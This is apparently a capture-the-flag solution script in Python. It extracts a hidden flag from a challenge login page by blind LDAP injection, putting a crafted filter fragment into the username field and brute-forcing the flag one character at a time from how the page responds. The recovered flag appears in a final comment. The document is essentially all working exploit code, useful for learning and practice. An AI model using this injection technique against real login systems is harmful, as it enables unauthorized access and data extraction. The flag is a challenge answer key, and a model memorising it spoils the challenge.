import string
import requests

url = "https://lightweight.chal.bts.wh.edu.pl/"
charset = string.ascii_letters + string.digits + '{}_-'
flag = ''

while True:
    found = False
    for ch in charset:
        prefix = flag + ch
        username = f'testuser)(|(description={prefix}*'
        password = "x)"
        data = {
            'username': username,
            'password': password
        }
        response = requests.post(url, data=data)
        if 'Invalid credentials' not in response.text:
            print(f'[+] Match: {prefix}')
            flag += ch
            found = True
            break
    if not found:
        print('[-] Extraction complete.')
        break
print('[*] Extracted flag:', flag)

# `BtSCTF{_bl1nd_ld4p_1nj3ct10n_y1pp333333}`
